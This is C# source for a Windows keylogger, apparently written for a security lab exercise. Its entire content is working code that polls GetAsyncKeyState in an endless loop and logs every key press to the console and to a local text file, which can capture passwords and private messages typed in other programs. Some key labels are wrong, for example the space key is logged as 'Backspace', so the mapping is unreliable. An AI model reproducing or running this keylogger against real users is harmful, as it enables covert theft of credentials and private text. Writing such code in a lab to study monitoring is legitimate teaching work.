using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace Task1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
       
        public static void AddToFile(string path, string name)
        {
            using (StreamWriter sw = File.AppendText(path))
            {
                sw.Write(name);
            }
        }

        static void Main(string[] args)
         {
            string writePath = @"E:\Labs_ISP\Lab4\Task1\ConsoleApp2\keylogger.txt";
            if (!File.Exists(writePath))
            {
                using (StreamWriter sw = File.CreateText(writePath))
                { 
                
                }
            }
            while (true)
            {
                Thread.Sleep(5);
                for (int i = 8; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 32768 && keyState != 0)
                    {
                        switch (i)
                        {
                            case 9:
                            {
                                Console.Write("TAB" + ',');
                                AddToFile(writePath, "TAB");
                            }
                            break;
                            case 13:
                            {
                                Console.Write("Enter" + ',');
                                AddToFile(writePath, "Enter");
                            }
                            break;
                            case 16:
                            {
                                Console.Write("Shift" + ',');
                                AddToFile(writePath, "Shift");
                            }
                            break;
                            case 17:
                            {
                                Console.Write("Ctrl" + ',');
                                AddToFile(writePath, "Ctrl");
                            }
                            break;
                            case 18:
                            {
                                Console.Write("Alt" + ',');
                                AddToFile(writePath, "Alt");
                            }
                            break;
                            case 20:
                            {
                                Console.Write("CapsLk" + ',');
                                AddToFile(writePath, "CapsLk");
                            }
                            break;
                            case 27:
                            {
                                Console.Write("Esc" + ',');
                                AddToFile(writePath, "Esc");
                            }
                            break;
                            case 32:
                            {
                                Console.Write("Backspace" + ',');
                                AddToFile(writePath, "Backspace");
                            }
                            break;
                            case 45:
                            {
                                Console.Write("Insert" + ',');
                                AddToFile(writePath, "Insert");
                            }
                            break;
                            case 44:
                            {
                                Console.Write("PrtSc" + ',');
                                AddToFile(writePath, "PrtSc");
                            }
                            break;
                            case 46:
                            {
                                Console.Write("Del" + ',');
                                AddToFile(writePath, "Del");
                            }
                            break;
                            case 112:
                            {
                                Console.Write("F1" + ',');
                                AddToFile(writePath, "F1");
                                }
                            break;
                            case 113:
                            {
                                Console.Write("F2" + ',');
                                AddToFile(writePath, "F2");
                            }
                            break;
                            case 114:
                            {
                                Console.Write("F3" + ',');
                                AddToFile(writePath, "F3");
                            }
                            break;
                            case 115:
                            {
                                Console.Write("F4" + ',');
                                AddToFile(writePath, "F4");
                            }
                            break;
                            case 116:
                            {
                               Console.Write("F5" + ',');
                               AddToFile(writePath, "F5");
                            }
                            break;
                            case 117:
                            {
                                Console.Write("F6" + ',');
                                AddToFile(writePath, "F6");
                            }
                            break;
                            case 118:
                            {
                                Console.Write("F7" + ',');
                                AddToFile(writePath, "F7");
                            }
                            break;
                            case 119:
                            {
                                Console.Write("F8" + ',');
                                AddToFile(writePath, "F8");
                            }
                            break;
                            case 120:
                            {
                                Console.Write("F9" + ',');
                                AddToFile(writePath, "F9");
                            }
                            break;
                            case 121:
                            {
                                Console.Write("F10" + ',');
                                AddToFile(writePath, "F10");
                            }
                            break;
                            case 122:
                            {
                                Console.Write("F11" + ',');
                                AddToFile(writePath, "F11");
                            }
                            break;
                            case 123:
                            {
                                Console.Write("F12" + ',');
                                AddToFile(writePath, "F12");
                            }
                            break;
                            default:
                            {
                                Console.Write((char)i + ",");
                                using (StreamWriter sw = File.AppendText(writePath))
                                {
                                    sw.Write((char)i);
                                }
                            }
                            break;
                        }
                    }
                }
            }
        }
    }
}